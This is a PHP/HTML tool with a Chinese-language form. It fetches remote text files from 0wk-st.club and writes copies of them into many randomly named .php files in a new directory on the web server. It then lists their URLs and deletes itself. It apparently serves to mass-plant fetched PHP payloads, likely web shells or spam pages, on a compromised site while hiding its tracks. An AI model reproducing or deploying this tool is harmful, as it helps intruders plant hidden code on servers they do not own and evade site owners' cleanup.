<html>
<head>
<link rel="stylesheet" href="http://www.bootcss.com/p/buttons/css/buttons.css">
<title>蜡笔小新</title>
</head>
<body>
		<center><font size="2" face="微软雅黑">
		<h2>樱桃小丸子</h2>
		<form method='post' action=''>
		输入文件数量:<input type="text" placeholder="文件数" min="1" style='width:56px;font-family:微软雅黑' name='num'>
		<br>
		输入目录名称:<input type="text" placeholder="目录名" style='width:60px;font-family:微软雅黑' name='new' >
		</p>
		<input style="Width:145px;height:28pt;display:inline-block;font-family:微软雅黑" type="submit" class="button button-glow button-border button-rounded button-primary" value='生成'>
		</p>
		选择需要生成:
		<form action="">
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/5.txt"/>1
        <input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/2.txt"/>2
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/6.txt"/>3
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/7.txt"/>4
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/8.txt"/>5
        <input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/1.txt"/>7
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/3.txt"/>8
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/4.txt"/>9
		</p>未经作者允许不得私自改版权@版权所有
		</form>
		</center>
	<hr />
</body>
</html>
<?php
	@$num = $_POST['num'];
	@$new = isset($_POST['new'])?$_POST['new']:'test';
	if($num == null){
		die();
	}
	@$ar=$num;
	$u = $_POST['month'];
	foreach($u as $vo){
		$s=file_get_contents($vo);
		@mkdir("$new");
		for($i=0; $i<$ar; $i++){
			$d=rand(4,5); //自行设置生成出的前缀长度
			$tmp=createRandomStr($d);
			
			$sheng = "./$new/$tmp.php";
			file_put_contents($sheng,$s);
			$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
			$url1 = dirname($url);
			
		
		} 
	}
	@unlink("test9.php"); //自删除
@unlink(php_self());

function myreaddir($dir) {
$handle=opendir($dir);
$i=0;
while($file=readdir($handle)) {
if (($file!=".")and($file!="..")) {
$list[$i]=$file;
$i=$i+1;
}
}
closedir($handle); 
return $list;
}

$input = myreaddir("./$new");
$a = array();
 foreach($input as $key=>$item){
	 
	 if(strpos($item,".php")!==false)
		$a[] = $item;
}
foreach($a as $key=>$value){
  echo $url1."/$new/".$value."<br>";
}




function php_self(){

    $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+2);

    return $php_self;

}

function createRandomStr($length){ 
$str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';//随机字符
$strlen = 62; 
while($length > $strlen){ 
$str .= $str; 
$strlen += 62; 
} 
$str = str_shuffle($str); 
return substr($str,0,$length); 
} 

?>